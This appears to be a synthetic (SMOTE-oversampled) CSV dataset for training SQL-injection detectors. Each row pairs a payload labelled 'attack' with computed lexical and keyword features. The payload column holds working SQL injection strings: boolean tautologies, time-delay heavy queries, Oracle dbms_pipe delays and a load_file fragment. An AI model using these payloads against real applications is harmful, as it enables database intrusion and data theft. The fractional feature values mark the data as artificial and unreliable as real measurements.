id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001468,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.0208387613353205,140.33624663407716,32.82969170740354,4.1138824435477686,65.34935648742443,16.82969170740354,42.49344507332637,15.66375336592283,0.46508558507923176,0.12008109875232512,0.3030900058674667,0.11174331030097642,0.6637533659228307,1.1102230246251565e-16,1.6681233170385847,0.0,1.0,2.0,0.0,5.497815024442123,0.0,0.16593834148070769,1.8340616585192924,5.0,0.16593834148070763,0.0,0.8340616585192923,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1659383414807079,0.0,1.0,1.0,0.16593834148070763,0.8340616585192921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.165938341480707
SMOTE_001469,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.17797743327237153,137.4262728616004,32.0,4.211866692368708,69.0,16.0,38.141018289280325,14.285254572320081,0.5022208579760936,0.11645701054518114,0.2773991651784996,0.10392296630022554,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.285254572320081,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001470,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,1.5758365795422886,138.02461512379028,35.719231095262145,4.030031780095163,52.635383180846574,19.719231095262142,47.694615971471855,17.975384876209713,0.380539969195933,0.14308731906876415,0.3459611550397127,0.13041155669559018,2.9753848762097133,1.1102230246251565e-16,0.5123075618951434,0.0,1.0,2.0,0.0,7.231538657157285,0.0,0.7438462190524283,1.2561537809475718,5.0,0.7438462190524283,0.0,0.2561537809475717,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7438462190524282,0.0,1.0,1.0,0.7438462190524283,0.2561537809475717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.743846219052428
SMOTE_001471,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,0.516538745662233,159.9703845038714,37.39111535116142,4.028151297710528,50.88371147712927,23.10148077480643,56.49259612596785,29.49259612596785,0.3177143655491927,0.1447192245665797,0.3533076271816259,0.1842587827026017,2.6955576755807087,0.10148077480643047,2.0,0.0,0.0,2.0,0.0,10.89851922519357,0.0,2.0,1.0,11.79703845038714,0.8985192251935695,0.10148077480643047,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.8985192251935696,0.0,1.0,0.0,0.8985192251935695,0.10148077480643047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8985192251935694
SMOTE_001472,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,2.5152739362190513,154.44674177522265,34.97869671008906,3.9883521359262857,50.48934835504453,20.356359621327925,55.11168544380566,28.48934835504453,0.3274232247089913,0.13091006771974453,0.35726955141318145,0.1843971561580827,1.8670112662833973,1.5106516449554706,1.2446741775222645,0.0,0.0,2.0,0.0,10.622337088761132,0.0,2.0,1.0,10.48934835504453,0.6223370887611324,0.3776629112388677,0.6223370887611324,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.6223370887611324,0.0,0.6223370887611325,0.0,1.3776629112388674,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6223370887611326
SMOTE_001473,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.0568360997096904,117.92701442936611,30.642730899678334,3.620372652188557,40.35550169581834,12.143025467095555,48.57151273354778,16.856974532904445,0.3320618877427521,0.10597907320957028,0.41851841024436087,0.1434406288033167,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,8.571512733547777,0.21424363322611126,0.7857563667738887,1.4284872664522226,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7857563667738888,0.2142436332261114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001474,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,2.426142507581869,159.2004276508838,36.6002138254419,3.9804061345074055,54.449625805476686,18.450694932686154,57.69989308727905,28.600213825441894,0.34272956319710063,0.11501534163559524,0.36279294147983127,0.17946215368747287,1.9501603690814207,1.0498396309185796,1.3001069127209468,0.0,0.0,1.6500534563604734,0.0,11.349946543639525,0.0,2.0,1.0,10.250267281802369,0.6500534563604735,0.34994654363952654,0.6500534563604734,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.6500534563604736,0.3499465436395265,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001475,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,3.469360784820705,77.4634670943681,22.410577849061347,3.344324269639003,17.410577849061347,13.58942215093865,33.28462279249079,13.178844301877303,0.224841876226394,0.17592067851839432,0.42838562907090805,0.17085181618430362,0.0,1.6423113962453937,0.0,0.0,0.41057784906134837,1.0,0.0,5.410577849061348,0.0,0.5894221509386516,2.3576886037546068,1.4105778490613488,0.0,0.41057784906134837,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4105778490613483,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5894221509386517,0.5894221509386515,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5894221509386517
SMOTE_001476,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,3.414904745586412,149.80133962259694,37.51205358490388,4.019443683108134,49.56026792451939,22.024107169807756,53.58437509432714,24.632589433942655,0.33176055435690277,0.14749367172159714,0.35824963534256876,0.16249613857893133,3.487946415096122,1.1102230246251565e-16,1.0241071698077557,0.0,0.48794641509612213,2.0,0.0,9.536160754711634,0.0,1.512053584903878,1.0,8.584375094327147,1.0,0.0,0.5120535849038779,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5120535849038779,1.4879464150961224,0.0,1.0,0.48794641509612213,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9758928301922443
SMOTE_001477,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.051640735543184,154.43702081702412,33.1684365927847,4.09698771107576,76.59483785310059,16.0,45.67374637113882,16.168436592784705,0.4955767903871527,0.10417780950214559,0.2954540903318018,0.10479130977889992,0.0,0.5842182963923523,2.0,0.0,1.0,2.0,0.0,5.584218296392352,0.0,0.0,2.0,5.0,0.0,0.5842182963923521,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001478,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.8781145710646756,123.14380646954895,32.0221240722383,3.633510032231468,37.055310180595754,15.527655090297875,51.0221240722383,19.538717126417026,0.2985119143007837,0.12419599190957518,0.42179501295950134,0.1554970808301397,1.5055310180595751,1.1102230246251565e-16,2.0,0.0,0.7472344909702123,1.2527655090297876,0.0,9.505531018059575,0.0,1.2527655090297878,1.0,6.0221240722383,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.25276550902978756,1.0,0.0,0.25276550902978756,0.7472344909702123,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001479,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,1.6210055641326175,89.33632440325403,22.66367559674597,3.069266047650008,12.313891378848815,15.004486604881043,45.345297613016115,16.672648806508057,0.13858076122100518,0.1678058843418219,0.5071885370978859,0.18642481733928695,4.0,1.1102230246251565e-16,0.6681622016270143,0.0,0.0,2.0,0.0,7.336324403254029,1.3363244032540287,0.33183779837298566,1.0,2.6681622016270143,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3318377983729857,0.6681622016270143,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001480,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.4933791212598388,141.54895849758904,33.0,4.153670811431121,71.0,9.0,42.45746541465754,19.091493082931507,0.5024955377511301,0.06369661746141086,0.2989894868514978,0.13481835793596125,0.5457465414657539,0.45425345853424604,2.0,0.0,1.0,1.0,0.0,6.091493082931508,1.0,0.0,3.0,4.0,0.545746541465754,0.45425345853424604,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001481,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.009860525928514082,142.0296107304683,30.011844292187327,3.8956034477690804,48.00592214609367,16.01036375566391,52.00740268261708,26.005922146093663,0.33800293990970354,0.11271943495117294,0.3661759443117403,0.18310168082738326,0.004441609570247529,3.9940778539063366,0.002961073046831686,0.0,0.0,2.0,0.0,10.001480536523417,0.0,2.0,1.0,8.005922146093663,0.001480536523415843,0.9985194634765842,0.001480536523415843,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.001480536523415843,0.0,0.001480536523415843,0.0,1.9985194634765842,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.001480536523416
SMOTE_001482,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,0.9396458225234426,144.86744664615347,32.80613151328668,4.1132265929543825,70.61226302657336,10.35707940699324,45.0613151328668,18.83678907972008,0.4877157839650553,0.07216304786977915,0.31048636115257133,0.12963480701259417,0.8061315132866802,1.1102230246251565e-16,2.0,0.0,1.0,1.19386848671332,0.0,6.41839453986004,0.8061315132866801,0.0,2.8061315132866804,4.19386848671332,0.8061315132866801,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.19386848671331994,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.19386848671332
SMOTE_001483,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.47768562000085,82.4350252888897,22.47281091944439,3.249983056811603,14.146541952777113,14.58156724166682,38.54378161111213,15.16313448333364,0.18103732333916253,0.1767838809501169,0.46006893860861653,0.18210985710210403,4.0,1.1102230246251565e-16,0.5271890805556065,0.0,0.0,2.0,0.0,6.108756322222426,1.0543781611112133,0.47281091944439335,1.0,2.5271890805556065,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4728109194443932,0.5271890805556066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001484,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.09452071038050439,140.24253136144142,32.0,4.1536241019566384,69.0,16.0,40.394025089153146,14.848506272288287,0.49208726199731645,0.11410719118778354,0.28794397954482137,0.10586156727007859,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.8485062722882875,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001485,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,2.5610565246940653,89.62655829361915,22.91562780425389,3.2066463271170784,19.373441706380838,13.0,43.253116587238324,14.0,0.21649664660283607,0.145086756016852,0.4821693216698559,0.15624727571045602,1.8312556085077834,2.168744391492216,0.0,0.0,0.542186097873054,1.4578139021269458,0.0,7.084372195746108,0.0,0.45781390212694595,0.45781390212694584,2.0,0.45781390212694595,0.542186097873054,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001486,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.4807377565522173,77.23824532673129,19.865204438942747,2.9161697398163677,15.074190809679894,10.283177180417043,39.671890965897205,12.20898637073715,0.1890497824226745,0.12695280469650672,0.5236860368061698,0.16031137607464896,0.0,4.0,0.0,0.0,0.7910136292628496,1.0,0.0,6.417972741474301,0.0,0.0,0.0,1.7910136292628498,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5820272585256991,0.20898637073715046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7910136292628498
SMOTE_001487,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.30417945238990834,74.86805446692033,22.94574659581748,3.5897900174208477,20.294705745627237,13.16276021254756,29.085068083650405,12.325520425095121,0.27321007227794125,0.17578972187065395,0.3867852121796338,0.16421499367177106,4.0,1.1102230246251565e-16,0.054253404182520226,0.0,0.0,2.0,0.0,4.217013616730082,0.10850680836504067,0.9457465958174797,1.0,2.0542534041825204,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9457465958174796,0.05425340418252034,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001488,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.446303578244283,106.94643206566755,28.27023786228883,4.043896748213247,61.920247646157996,5.702378622888294,27.32380579662127,12.0,0.5700129455639833,0.05631801153749981,0.26099610603553,0.11267293686298699,2.4595242754223414,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.351189311444147,0.0,0.2702378622888294,1.7297621377111705,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001489,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,0.938354431995037,137.56038114860914,30.43961885139085,4.0636500523359675,74.41384153147887,8.146539617130284,37.0,18.0,0.5409061484271818,0.059245272033016966,0.26898904441768445,0.13085953512211676,3.4138415314788637,0.14653961713028407,0.29307923426056803,0.0,1.0,1.853460382869716,0.0,4.146539617130284,1.853460382869716,0.0,2.146539617130284,3.146539617130284,0.8534603828697159,0.14653961713028402,0.14653961713028404,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7069207657394316,0.14653961713028407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.853460382869716
SMOTE_001490,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,3.4217667661290005,79.08190301356933,16.338764525554474,2.3527306018980982,6.382504150158418,9.530016600633683,47.19125207507921,15.978130187698026,0.07861907396925982,0.10588907334037424,0.6129243989604587,0.20256745372990725,2.3825041501584208,1.6174958498415792,0.5956260375396052,0.0,0.0,1.5956260375396052,0.0,8.0,1.1912520750792104,0.0,0.5956260375396052,2.1912520750792104,0.5956260375396052,0.4043739624603948,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5956260375396053,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5956260375396052
SMOTE_001491,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.7931235018535775,137.89501109503533,33.0,4.201437949925612,71.0,9.0,39.412509245862786,18.482501849172557,0.5155683654448219,0.06535373646483658,0.28508809965609316,0.13398979843424838,0.24125092458627884,0.7587490754137213,2.0,0.0,1.0,1.0,0.0,5.482501849172557,1.0,0.0,3.0,4.0,0.24125092458627873,0.7587490754137212,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001492,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.1279709007984835,107.83862589907486,28.210758273395008,4.078932017832896,64.35891079080461,5.107582733950094,26.372132374320152,12.0,0.5893036230430599,0.04987104033138476,0.24915712254793687,0.11166821407761841,2.578483453209981,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.053791366975048,0.0,0.21075827339500952,1.7892417266049905,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001493,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,1.9295968502542031,148.4351267416214,33.4632802324697,4.159852076833224,76.09608255716674,12.242961627287924,42.55936278963644,17.536719767530297,0.5139149569359707,0.08097938929581197,0.2855200671707736,0.11958558659744375,0.0,1.0,2.0,0.0,1.0,1.4632802324697034,0.0,5.463280232469703,0.5367197675302966,0.0,2.536719767530297,4.463280232469703,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4632802324697034,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.463280232469703
SMOTE_001494,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.286453884630898,82.63798612025599,23.233998017179427,3.3071346859524797,18.70199405153829,13.0,38.467996034358855,12.467996034358857,0.22606309876683403,0.15750647873690685,0.4657216899850364,0.1507087325112227,0.9359920687177129,3.064007931282287,0.0,0.0,0.7660019828205717,1.2339980171794283,0.0,6.0,0.0,0.23399801717942825,0.23399801717942825,2.0,0.2339980171794282,0.7660019828205717,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001495,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,4.05157479075411,97.88190473884907,25.274467117985626,3.519047542884408,28.960634912949697,13.0,42.40495841390897,13.516311411990419,0.2924212846757197,0.1450518088769937,0.4175649625114904,0.1449619439357962,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.274467117985626,0.0,0.6209221470023956,0.6209221470023956,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3790778529976043,0.0,0.37907785299760455,0.0,0.0,0.0,1.6209221470023956,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3790778529976043,0.3790778529976043,2.758155705995209
